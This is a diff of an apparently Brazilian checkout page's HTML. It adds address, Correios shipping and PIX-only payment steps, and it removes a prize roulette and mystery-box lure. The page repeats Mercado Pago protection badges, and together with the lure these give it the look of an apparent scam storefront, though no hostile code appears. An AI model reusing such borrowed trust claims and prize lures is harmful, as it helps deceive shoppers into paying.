+      <div class="security-note">
+        <svg class="security-lock-icon" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          <circle cx="12" cy="16" r="1" fill="#475569" stroke="none"/>
+          <line x1="12" y1="16" x2="12" y2="18.5"/>
+        </svg>
+        <div class="security-text-col">
+          <span class="security-text-main">Seus dados estão protegidos pelo Mercado Pago.</span>
+          <a href="https://www.mercadopago.com.br/ajuda/compra-protegida_601" target="_blank" rel="noopener noreferrer" class="security-link">Saiba mais.</a>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 2: Endereço de entrega -->
+    <section class="checkout-step" data-panel="1" hidden>
+      <h1 class="section-title">Endereço de entrega</h1>
+      <p class="section-desc">Informe onde você quer receber o seu pedido.</p>
+
+      <div class="form-card">
+        <div class="field">
+          <label for="cep">CEP <span class="field-check-badge" id="cepCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+          <div class="cep-field-wrap">
+            <input id="cep" type="tel" placeholder="00000-000" required maxlength="9">
+            <button class="btn-buscar-cep" id="searchCep" type="button">Buscar CEP</button>
+          </div>
+          <div style="margin-top: 6px; text-align: left;">
+            <button type="button" id="btnOpenCepModal" class="btn-link-address-search">Não sabe seu CEP? Buscar pelo endereço ›</button>
+          </div>
+          <p class="field-error" id="cepError"></p>
+          <p id="cepStatus"></p>
+        </div>
+        <div class="field">
+          <label for="street">Rua / Avenida <span class="field-check-badge" id="streetCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+          <input id="street" type="text" placeholder="Digite o nome da sua rua" required>
+          <p class="field-error" id="streetError"></p>
+        </div>
+        <div class="fields-grid-2 number-comp">
+          <div class="field">
+            <label for="number">Número <span class="field-check-badge" id="numberCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+            <input id="number" type="text" placeholder="Nº" required>
+            <p class="field-error" id="numberError"></p>
+          </div>
+          <div class="field">
+            <label for="extra">Complemento (opcional) <span class="field-check-badge" id="extraCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+            <input id="extra" type="text" placeholder="Apto, bloco, etc.">
+          </div>
+        </div>
+        <div class="fields-grid-2 city-state">
+          <div class="field">
+            <label for="city">Cidade <span class="field-check-badge" id="cityCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+            <input id="city" type="text" placeholder="Digite sua cidade" required>
+            <p class="field-error" id="cityError"></p>
+          </div>
+          <div class="field">
+            <label for="state">Estado <span class="field-check-badge" id="stateCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+            <select id="state" required>
+              <option value="">UF</option>
+              <option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option>
+              <option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option>
+              <option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option>
+              <option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option>
+              <option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option>
+              <option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option>
+              <option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option>
+              <option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option>
+              <option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+            </select>
+            <p class="field-error" id="stateError"></p>
+          </div>
+        </div>
+        <input id="district" type="hidden" value="Centro">
+      </div>
+
+      <div class="shipping-section-header">
+        <h2 class="shipping-section-title">Opções de entrega</h2>
+        <p class="shipping-section-sub">Escolha a opção que melhor se encaixa para você.</p>
+      </div>
+
+      <div class="shipping-options-list">
+        <!-- PAC (Frete grátis) - Top, Selected by default -->
+        <div class="shipping-option-card selected" id="shipOptionPac" data-shipping-method="pac" data-fee="0">
+          <div class="ship-radio">
+            <div class="ship-radio-circle">
+              <div class="ship-radio-dot"></div>
+            </div>
+          </div>
+
+          <div class="ship-brand-col">
+            <svg class="correios-real-logo" viewBox="0 0 445.3 91.2" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <linearGradient id="corG1" gradientUnits="userSpaceOnUse" x1="68.84" y1="28.89" x2="10.05" y2="74.82">
+      <stop offset="0" stop-color="#FFDD00"/>
+      <stop offset="0.9" stop-color="#D49F00"/>
+      <stop offset="1" stop-color="#FFDD00"/>
+    </linearGradient>
+    <linearGradient id="corG2" gradientUnits="userSpaceOnUse" x1="70.01" y1="75.86" x2="27.21" y2="75.86">
+      <stop offset="0" stop-color="#D49F00"/>
+      <stop offset="1" stop-color="#AB5808"/>
+    </linearGradient>
+    <linearGradient id="corG3" gradientUnits="userSpaceOnUse" x1="55.92" y1="62.21" x2="114.81" y2="16.37">
+      <stop offset="0" stop-color="#00537E"/>
+      <stop offset="0.9" stop-color="#18AAE2"/>
+      <stop offset="1" stop-color="#107BC0"/>
+    </linearGradient>
+    <linearGradient id="corG4" gradientUnits="userSpaceOnUse" x1="91.80" y1="-4.21" x2="66.79" y2="15.32">
+      <stop offset="0" stop-color="#002542"/>
+      <stop offset="1" stop-color="#004169"/>
+    </linearGradient>
+  </defs>
+  <path fill="url(#corG1)" fill-rule="evenodd" clip-rule="evenodd" d="M31.7 91.2h-4c-3.2 0-6.1-1.5-8-3.9L0.7 62.9C0.3 62.3 0 61.6 0 60.8c0-0.8 0.3-1.5 0.7-2.1l19.1-24.4c1.9-2.4 4.7-3.9 8-3.9H70l-24 30.1L28.5 82.6L31.7 91.2z"/>
+  <path fill="url(#corG2)" fill-rule="evenodd" clip-rule="evenodd" d="M46.3 60.8l-0.2-0.3L28.5 82.6c-0.7 0.9-1.3 2.1-1.3 4.1c0 2 1.9 4.5 5.7 4.5H70L46.3 60.8z"/>
+  <path fill="url(#corG3)" fill-rule="evenodd" clip-rule="evenodd" d="M96.3 8.6L93.1 0h4c3.2 0 6.1 1.5 8 3.9l19.1 24.4c0.4 0.6 0.7 1.3 0.7 2.1c0 0.8-0.3 1.5-0.7 2.1L105 56.9c-1.9 2.4-4.7 3.9-8 3.9H54.8l24-30.1L96.3 8.6z"/>
+  <path fill="url(#corG4)" fill-rule="evenodd" clip-rule="evenodd" d="M78.6 30.4l0.2 0.3L96.3 8.6c0.7-0.9 1.3-2.1 1.3-4.1c0-2-1.9-4.5-5.7-4.5H54.8L78.6 30.4z"/>
+  <path fill="#0BBBEF" d="M97.3 8.2c0.7-0.9 1.1-1.9 1.1-3.1c0-2.8-2.3-5.1-5.1-5.1H92C94.8 0 97 2.3 97 5.1c0 1.2-0.4 2.3-1.1 3.1L78.6 30.4L54.9 60.7L97.3 8.2z"/>
+  <path fill="#FFD500" d="M27.6 83c-0.7 0.9-1.1 1.9-1.1 3.1c0 2.8 2.3 5.1 5.1 5.1h1.3c-2.8 0-5.1-2.3-5.1-5.1c0-1.2 0.4-2.3 1.1-3.1l17.4-22.2L70 30.5L27.6 83z"/>
+  <path fill="#06416A" d="M283.2 42.8c-2.4 0-4.3.3-6.3.9-3.2 1-5.6 2.7-7.4 5.1-3.1 4-3 8.8-3 8.8v33.4h8.9c.6 0 1-.5 1-1V58.3c0-.6.1-2.8 1.3-3.9 1-.9 2.3-1.3 3.6-1.5 1.4-.2 2.8-.1 3.5 0h.2c.7 0 1.2-.4 1.5-.9l4.6-7.9c-2.4-.9-5-1.4-7.9-1.3"/>
+  <path fill="#06416A" d="M257 42.8c-2.4 0-4.4.3-6.3.9-3.2 1-5.6 2.7-7.4 5.1-3.1 4-3 8.8-3 8.8v33.4h8.9c.6 0 1-.5 1-1V58.3c0-.6.1-2.8 1.3-3.9 1-.9 2.3-1.3 3.6-1.5 1.4-.2 2.8-.1 3.5 0h.2c.6 0 1.2-.4 1.5-.9L265 44c-2.6-.8-5.1-1.3-8-1.2"/>
+  <path fill="#06416A" d="M179.2 78.7c-.3-.4-.9-.7-1.5-.7-.3 0-.7.1-.9.3-3 1.8-6.6 2.9-10.4 2.9-11.2 0-20.3-9.1-20.3-20.4 0-11.2 9.1-20.3 20.3-20.3 3.8 0 7.4 1 10.4 2.9.3.2.6.3 1 .3.6 0 1.1-.3 1.5-.7l5.1-6.6c-5-3.7-11.2-5.9-18-5.9-16.8 0-30.4 13.6-30.4 30.4 0 16.8 13.6 30.4 30.4 30.4 6.7 0 12.9-2.2 18-5.9l-5.6-7.3z"/>
+  <path fill="#06416A" d="M314.3 51.7c6.6 0 12.2 4.3 14.2 10.2h-28.3c2-5.9 7.6-10.2 14.1-10.2m0-9.6c-13.5 0-24.5 11-24.5 24.5 0 13.4 11 24.4 24.5 24.5h.7c5.3 0 9.6-.7 15.3-4.4l.9-.6-5.1-6.6c-.3-.4-.9-.7-1.4-.7-.3 0-.6.1-.9.2-1.3.7-5.2 2.4-9.5 2.4-6.5 0-12-4.1-14.1-9.9h33.6l3.9 0c.6 0 1-.5 1-1l.1-2.8c0-.4 0-.7 0-1.1 0-13.5-11-24.5-24.6-24.5z"/>
+  <path fill="#06416A" d="M345.6 91.2c-.6 0-1-.4-1-1V44.7c0-.5.4-1 1-1h7.9c.6 0 1 .5 1 1v45.5c0 .6-.5 1-1 1h-7.9z"/>
+  <path fill="#06416A" d="M210.7 51.5c-8.2 0-14.8 6.6-14.8 14.8s6.6 14.8 14.8 14.8 14.8-6.6 14.8-14.8-6.6-14.8-14.8-14.8m0 39.7c-13.7 0-24.8-11.1-24.8-24.8 0-13.7 11.1-24.8 24.8-24.8 13.7 0 24.8 11.1 24.8 24.8 0 13.6-11.1 24.8-24.8 24.8z"/>
+  <path fill="#06416A" d="M384.1 51.9c-8.1 0-14.7 6.6-14.7 14.7 0 8.1 6.6 14.6 14.7 14.6 8.1 0 14.7-6.6 14.7-14.6 0-8.1-6.6-14.7-14.7-14.7m0 39.2c-13.6 0-24.6-11-24.6-24.6 0-13.6 11-24.6 24.6-24.6 13.6 0 24.6 11 24.6 24.6 0 13.6-11 24.6-24.6 24.6z"/>
+  <path fill="#06416A" d="M436.6 62.8c-1.7-.8-3.9-1.3-6.3-1.9-3.5-.9-6.8-1.1-8-3-1.1-1.8-.5-3.8 1-4.9 3.5-2.4 8.2-1.4 10.8-.2.5.2 2.4 1.3 2.4 1.3.3.2.6.3.9.3.6 0 1.1-.3 1.5-.8 0 0 5-6.4 5-6.4l-.8-.7c-.5-.4-1.2-.8-1.9-1.2-1.5-.8-6-3.4-12.5-3.4-.2 0-.4 0-.6 0-14.3.3-16.3 10.4-16.3 14 0 5.4 2.8 9.3 7 11.7 3.4 1.9 9.7 3 12.9 4 1.7.5 2.9 1.7 3.4 2.8.2.5.3 1 .3 1.6.1 1.9-.9 4-3.7 4.9-3.1.9-7.9.5-12.3-2.9-.1-.1-.6-.5-.8-.6-.2-.1-.4-.1-.7-.1-.6 0-1.1.3-1.5.8-.1.1-4.9 6.3-4.9 6.3s1.7 1.4 2.3 1.8c2.8 2.1 7.8 4.9 14.3 4.9h.2c13.8 0 17-9.8 17-15.2-.1-4.7-3.4-10-8.8-12.4z"/>
+</svg>
+          </div>
+
+          <div class="ship-info-col">
+            <h3 class="ship-title">PAC — Entrega econômica</h3>
+            <p class="ship-deadline">Receba em 5 a 10 dias úteis</p>
+          </div>
+
+          <div class="ship-badge-col">
+            <span class="badge-frete-gratis">Frete grátis</span>
+          </div>
+        </div>
+
+        <!-- SEDEX (Entrega expressa) - Bottom, Paid -->
+        <div class="shipping-option-card" id="shipOptionSedex" data-shipping-method="sedex" data-fee="1783">
+          <div class="ship-radio">
+            <div class="ship-radio-circle">
+              <div class="ship-radio-dot"></div>
+            </div>
+          </div>
+
+          <div class="ship-brand-col">
+            <svg class="correios-real-logo" viewBox="0 0 445.3 91.2" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <linearGradient id="corG1" gradientUnits="userSpaceOnUse" x1="68.84" y1="28.89" x2="10.05" y2="74.82">
+      <stop offset="0" stop-color="#FFDD00"/>
+      <stop offset="0.9" stop-color="#D49F00"/>
+      <stop offset="1" stop-color="#FFDD00"/>
+    </linearGradient>
+    <linearGradient id="corG2" gradientUnits="userSpaceOnUse" x1="70.01" y1="75.86" x2="27.21" y2="75.86">
+      <stop offset="0" stop-color="#D49F00"/>
+      <stop offset="1" stop-color="#AB5808"/>
+    </linearGradient>
+    <linearGradient id="corG3" gradientUnits="userSpaceOnUse" x1="55.92" y1="62.21" x2="114.81" y2="16.37">
+      <stop offset="0" stop-color="#00537E"/>
+      <stop offset="0.9" stop-color="#18AAE2"/>
+      <stop offset="1" stop-color="#107BC0"/>
+    </linearGradient>
+    <linearGradient id="corG4" gradientUnits="userSpaceOnUse" x1="91.80" y1="-4.21" x2="66.79" y2="15.32">
+      <stop offset="0" stop-color="#002542"/>
+      <stop offset="1" stop-color="#004169"/>
+    </linearGradient>
+  </defs>
+  <path fill="url(#corG1)" fill-rule="evenodd" clip-rule="evenodd" d="M31.7 91.2h-4c-3.2 0-6.1-1.5-8-3.9L0.7 62.9C0.3 62.3 0 61.6 0 60.8c0-0.8 0.3-1.5 0.7-2.1l19.1-24.4c1.9-2.4 4.7-3.9 8-3.9H70l-24 30.1L28.5 82.6L31.7 91.2z"/>
+  <path fill="url(#corG2)" fill-rule="evenodd" clip-rule="evenodd" d="M46.3 60.8l-0.2-0.3L28.5 82.6c-0.7 0.9-1.3 2.1-1.3 4.1c0 2 1.9 4.5 5.7 4.5H70L46.3 60.8z"/>
+  <path fill="url(#corG3)" fill-rule="evenodd" clip-rule="evenodd" d="M96.3 8.6L93.1 0h4c3.2 0 6.1 1.5 8 3.9l19.1 24.4c0.4 0.6 0.7 1.3 0.7 2.1c0 0.8-0.3 1.5-0.7 2.1L105 56.9c-1.9 2.4-4.7 3.9-8 3.9H54.8l24-30.1L96.3 8.6z"/>
+  <path fill="url(#corG4)" fill-rule="evenodd" clip-rule="evenodd" d="M78.6 30.4l0.2 0.3L96.3 8.6c0.7-0.9 1.3-2.1 1.3-4.1c0-2-1.9-4.5-5.7-4.5H54.8L78.6 30.4z"/>
+  <path fill="#0BBBEF" d="M97.3 8.2c0.7-0.9 1.1-1.9 1.1-3.1c0-2.8-2.3-5.1-5.1-5.1H92C94.8 0 97 2.3 97 5.1c0 1.2-0.4 2.3-1.1 3.1L78.6 30.4L54.9 60.7L97.3 8.2z"/>
+  <path fill="#FFD500" d="M27.6 83c-0.7 0.9-1.1 1.9-1.1 3.1c0 2.8 2.3 5.1 5.1 5.1h1.3c-2.8 0-5.1-2.3-5.1-5.1c0-1.2 0.4-2.3 1.1-3.1l17.4-22.2L70 30.5L27.6 83z"/>
+  <path fill="#06416A" d="M283.2 42.8c-2.4 0-4.3.3-6.3.9-3.2 1-5.6 2.7-7.4 5.1-3.1 4-3 8.8-3 8.8v33.4h8.9c.6 0 1-.5 1-1V58.3c0-.6.1-2.8 1.3-3.9 1-.9 2.3-1.3 3.6-1.5 1.4-.2 2.8-.1 3.5 0h.2c.7 0 1.2-.4 1.5-.9l4.6-7.9c-2.4-.9-5-1.4-7.9-1.3"/>
+  <path fill="#06416A" d="M257 42.8c-2.4 0-4.4.3-6.3.9-3.2 1-5.6 2.7-7.4 5.1-3.1 4-3 8.8-3 8.8v33.4h8.9c.6 0 1-.5 1-1V58.3c0-.6.1-2.8 1.3-3.9 1-.9 2.3-1.3 3.6-1.5 1.4-.2 2.8-.1 3.5 0h.2c.6 0 1.2-.4 1.5-.9L265 44c-2.6-.8-5.1-1.3-8-1.2"/>
+  <path fill="#06416A" d="M179.2 78.7c-.3-.4-.9-.7-1.5-.7-.3 0-.7.1-.9.3-3 1.8-6.6 2.9-10.4 2.9-11.2 0-20.3-9.1-20.3-20.4 0-11.2 9.1-20.3 20.3-20.3 3.8 0 7.4 1 10.4 2.9.3.2.6.3 1 .3.6 0 1.1-.3 1.5-.7l5.1-6.6c-5-3.7-11.2-5.9-18-5.9-16.8 0-30.4 13.6-30.4 30.4 0 16.8 13.6 30.4 30.4 30.4 6.7 0 12.9-2.2 18-5.9l-5.6-7.3z"/>
+  <path fill="#06416A" d="M314.3 51.7c6.6 0 12.2 4.3 14.2 10.2h-28.3c2-5.9 7.6-10.2 14.1-10.2m0-9.6c-13.5 0-24.5 11-24.5 24.5 0 13.4 11 24.4 24.5 24.5h.7c5.3 0 9.6-.7 15.3-4.4l.9-.6-5.1-6.6c-.3-.4-.9-.7-1.4-.7-.3 0-.6.1-.9.2-1.3.7-5.2 2.4-9.5 2.4-6.5 0-12-4.1-14.1-9.9h33.6l3.9 0c.6 0 1-.5 1-1l.1-2.8c0-.4 0-.7 0-1.1 0-13.5-11-24.5-24.6-24.5z"/>
+  <path fill="#06416A" d="M345.6 91.2c-.6 0-1-.4-1-1V44.7c0-.5.4-1 1-1h7.9c.6 0 1 .5 1 1v45.5c0 .6-.5 1-1 1h-7.9z"/>
+  <path fill="#06416A" d="M210.7 51.5c-8.2 0-14.8 6.6-14.8 14.8s6.6 14.8 14.8 14.8 14.8-6.6 14.8-14.8-6.6-14.8-14.8-14.8m0 39.7c-13.7 0-24.8-11.1-24.8-24.8 0-13.7 11.1-24.8 24.8-24.8 13.7 0 24.8 11.1 24.8 24.8 0 13.6-11.1 24.8-24.8 24.8z"/>
+  <path fill="#06416A" d="M384.1 51.9c-8.1 0-14.7 6.6-14.7 14.7 0 8.1 6.6 14.6 14.7 14.6 8.1 0 14.7-6.6 14.7-14.6 0-8.1-6.6-14.7-14.7-14.7m0 39.2c-13.6 0-24.6-11-24.6-24.6 0-13.6 11-24.6 24.6-24.6 13.6 0 24.6 11 24.6 24.6 0 13.6-11 24.6-24.6 24.6z"/>
+  <path fill="#06416A" d="M436.6 62.8c-1.7-.8-3.9-1.3-6.3-1.9-3.5-.9-6.8-1.1-8-3-1.1-1.8-.5-3.8 1-4.9 3.5-2.4 8.2-1.4 10.8-.2.5.2 2.4 1.3 2.4 1.3.3.2.6.3.9.3.6 0 1.1-.3 1.5-.8 0 0 5-6.4 5-6.4l-.8-.7c-.5-.4-1.2-.8-1.9-1.2-1.5-.8-6-3.4-12.5-3.4-.2 0-.4 0-.6 0-14.3.3-16.3 10.4-16.3 14 0 5.4 2.8 9.3 7 11.7 3.4 1.9 9.7 3 12.9 4 1.7.5 2.9 1.7 3.4 2.8.2.5.3 1 .3 1.6.1 1.9-.9 4-3.7 4.9-3.1.9-7.9.5-12.3-2.9-.1-.1-.6-.5-.8-.6-.2-.1-.4-.1-.7-.1-.6 0-1.1.3-1.5.8-.1.1-4.9 6.3-4.9 6.3s1.7 1.4 2.3 1.8c2.8 2.1 7.8 4.9 14.3 4.9h.2c13.8 0 17-9.8 17-15.2-.1-4.7-3.4-10-8.8-12.4z"/>
+</svg>
+          </div>
+
+          <div class="ship-info-col">
+            <h3 class="ship-title">SEDEX — Entrega expressa</h3>
+            <p class="ship-deadline">Receba em 2 a 5 dias úteis</p>
+          </div>
+
+          <div class="ship-badge-col">
+            <span class="price-sedex">R$ 17,83</span>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn-primary" data-next type="button">
+        <span>Continuar para o pagamento</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg>
+      </button>
+      <div class="security-note">
+        <svg class="security-lock-icon" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          <circle cx="12" cy="16" r="1" fill="#475569" stroke="none"/>
+          <line x1="12" y1="16" x2="12" y2="18.5"/>
+        </svg>
+        <div class="security-text-col">
+          <span class="security-text-main">Seus dados estão protegidos pelo Mercado Pago.</span>
+          <a href="https://www.mercadopago.com.br/ajuda/compra-protegida_601" target="_blank" rel="noopener noreferrer" class="security-link">Saiba mais.</a>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 3: Como você quer pagar? -->
+    <section class="checkout-step" data-panel="2" hidden>
+      <h1 class="section-title">Como você quer pagar?</h1>
+      <p class="section-desc">Escolha uma das formas seguras gerenciadas pelo Mercado Pago.</p>
+
+      <form id="checkoutForm" onsubmit="return false;">
+        <div class="payment-methods">
+          <div class="payment-card active">
+            <div class="payment-card-left">
+              <div class="pm-icon-wrap pix">
+                <svg class="pix-real-icon" width="24" height="24" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
+  <path d="M5.283 18.36a3.505 3.505 0 0 0 2.493-1.032l3.6-3.6a.684.684 0 0 1 .946 0l3.613 3.613a3.504 3.504 0 0 0 2.493 1.032h.71l-4.56 4.56a3.647 3.647 0 0 1-5.156 0L4.85 18.36ZM18.428 5.627a3.505 3.505 0 0 0-2.493 1.032l-3.613 3.614a.67.67 0 0 1-.946 0l-3.6-3.6A3.505 3.505 0 0 0 5.283 5.64h-.434l4.573-4.572a3.646 3.646 0 0 1 5.156 0l4.559 4.559ZM1.068 9.422 3.79 6.699h1.492a2.483 2.483 0 0 1 1.744.722l3.6 3.6a1.73 1.73 0 0 0 2.443 0l3.614-3.613a2.482 2.482 0 0 1 1.744-.723h1.767l2.737 2.737a3.646 3.646 0 0 1 0 5.156l-2.736 2.736h-1.768a2.482 2.482 0 0 1-1.744-.722l-3.613-3.613a1.77 1.77 0 0 0-2.444 0l-3.6 3.6a2.483 2.483 0 0 1-1.744.722H3.791l-2.723-2.723a3.646 3.646 0 0 1 0-5.156"/>
+</svg>
+              </div>
+              <div class="pm-texts">
+                <h3>PIX</h3>
+                <p>Aprovação imediata e envio prioritário</p>
+              </div>
+            </div>
+            <div class="pm-chevron">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 18 15 12 9 6"></polyline>
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <button class="btn-primary" id="finish" type="submit">
+          <span>Continuar com Pix</span>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"></polyline>
+          </svg>
+        </button>
+        <div class="security-note">
+          <svg class="security-lock-icon" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            <circle cx="12" cy="16" r="1" fill="#475569" stroke="none"/>
+            <line x1="12" y1="16" x2="12" y2="18.5"/>
+          </svg>
+          <div class="security-text-col">
+            <span class="security-text-main">Seus dados estão protegidos pelo Mercado Pago.</span>
+            <a href="https://www.mercadopago.com.br/ajuda/compra-protegida_601" target="_blank" rel="noopener noreferrer" class="security-link">Saiba mais.</a>
+          </div>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <!-- Modal: Descobrir CEP pelo endereço -->
+  <div id="cepSearchModal" class="cep-modal-backdrop" hidden>
+    <div class="cep-modal-content">
+      <div class="cep-modal-header">
+        <h3>Descobrir CEP pelo endereço</h3>
+        <button type="button" id="btnCloseCepModal" class="btn-close-modal">&times;</button>
+      </div>
+      <div class="cep-modal-body">
+        <p class="cep-modal-desc">Informe seu estado, cidade e nome da rua para localizarmos o CEP oficial:</p>
+        <div class="modal-form-grid">
+          <div class="modal-field">
+            <label>Estado (UF)</label>
+            <select id="modalCepUf" class="modal-input">
+              <option value="SP" selected>SP - São Paulo</option>
+              <option value="RJ">RJ - Rio de Janeiro</option>
+              <option value="MG">MG - Minas Gerais</option>
+              <option value="RS">RS - Rio Grande do Sul</option>
+              <option value="PR">PR - Paraná</option>
+              <option value="SC">SC - Santa Catarina</option>
+              <option value="BA">BA - Bahia</option>
+              <option value="GO">GO - Goiás</option>
+              <option value="PE">PE - Pernambuco</option>
+              <option value="CE">CE - Ceará</option>
+              <option value="DF">DF - Distrito Federal</option>
+              <option value="ES">ES - Espírito Santo</option>
+              <option value="MA">MA - Maranhão</option>
+              <option value="MT">MT - Mato Grosso</option>
+              <option value="MS">MS - Mato Grosso do Sul</option>
+              <option value="PA">PA - Pará</option>
+              <option value="PB">PB - Paraíba</option>
+              <option value="RN">RN - Rio Grande do Norte</option>
+              <option value="AL">AL - Alagoas</option>
+              <option value="PI">PI - Piauí</option>
+              <option value="SE">SE - Sergipe</option>
+              <option value="AM">AM - Amazonas</option>
+              <option value="RO">RO - Rondônia</option>
+              <option value="AC">AC - Acre</option>
+              <option value="AP">AP - Amapá</option>
+              <option value="RR">RR - Roraima</option>
+              <option value="TO">TO - Tocantins</option>
+            </select>
+          </div>
+          <div class="modal-field">
+            <label>Cidade</label>
+            <input type="text" id="modalCepCity" class="modal-input" placeholder="Ex: São Paulo">
+          </div>
+          <div class="modal-field">
+            <label>Rua / Avenida</label>
+            <input type="text" id="modalCepStreet" class="modal-input" placeholder="Ex: Paulista ou Rua das Flores">
+          </div>
+        </div>
+        <button type="button" id="btnDoSearchCepByAddress" class="btn-primary" style="margin-top: 14px; height: 46px; font-size: 15px;">
+          Pesquisar CEP
+        </button>
+        <div id="modalCepStatus" style="margin-top: 10px; font-size: 13.5px; font-weight: 600;"></div>
+        <div id="modalCepResults" class="modal-cep-results"></div>
+      </div>
     </div>
-    <div class="rl-hub">BÔNUS</div>
-   </div>
-   <button type="button" class="rl-btn" id="rl-spin-btn">GIRAR ROLETA</button>
   </div>
-  <div class="rl-result sf-hidden" id="rl-result">
-   <div class="rl-eyebrow">PARABÉNS!</div>
-   <div class="rl-title">Seu bônus foi liberado</div>
-   <div class="rl-prize">
-    <div class="rl-prize-badge">★ BÔNUS EXCLUSIVO GARANTIDO</div>
-    <div class="rl-prize-ic" id="rl-prize-ic">🎁</div>
-    <div>
-     <b id="rl-prize-name">Brinde extra na caixa</b>
-     <small id="rl-prize-desc">Enviamos um item a mais junto com seu pedido.</small>
-    </div>
-   </div>
-   <div class="rl-peek" id="rl-peek">
-    <div class="rl-peek-t">Sua caixa pode conter:</div>
-    <div class="rl-peek-grid">
-     <div class="rl-peek-i"><img src="/assets/peek-iphone.png" alt="iPhone"><span>?<small>iPhone</small></span></div>
-     <div class="rl-peek-i"><img src="/assets/peek-jbl.png" alt="JBL"><span>?<small>JBL</small></span></div>
-     <div class="rl-peek-i"><img src="/assets/peek-samsung.png" alt="Samsung"><span>?<small>Samsung</small></span></div>
-     <div class="rl-peek-i"><img src="/assets/peek-xiaomi.png" alt="Xiaomi"><span>?<small>Xiaomi</small></span></div>
-    </div>
-    <div class="rl-peek-n">Conteúdo aleatório — revelado quando você abrir a caixa.</div>
-   </div>
-   <button type="button" class="rl-btn" id="rl-claim-btn">RESGATAR E GERAR PIX</button>
-  </div>
- </div>
-</div>
 
-<header class="header" style="position:relative">
- <div class="header-logo">
- <img src="/assets/f4e97641be0a8ceb.png" alt="Deveu Perdeu">
- </div>
- <div class="header-secure">
- <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
- <span>Pagamento 100% seguro</span>
- </div>
-</header>
-<div class="banner">
- <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 12a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8c.76 0 1.5.11 2.2.31L16 2.31A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10M7.91 10.08L6.5 11.5 11 16 21 6l-1.41-1.42L11 13.17l-3.09-3.09Z"></path></svg>
- Preencha as informações corretamente para envio do código de rastreio.
-</div>
-<main class="main"><form id="checkoutForm" novalidate>
- <div class="steps"><span><i>1</i>Dados</span><hr><span><i>2</i>Entrega</span><hr><span><i>3</i>Pagamento</span></div>
+  <!-- generated:checkout:start -->
+  <script>
+  (()=>{
+    const el = id => document.getElementById(id);
+    const digits = s => String(s || '').replace(/\D/g, '');
+    let activeStep = 0;
+    let maxUnlockedStep = 0;
+    let cepAbortController = null;
+    let cepDebounceTimer = null;
 
- <div class="section" id="sec-dados">
- <div class="section-header">
- <div class="section-left">
- <div class="step-badge" id="badge-1">1</div>
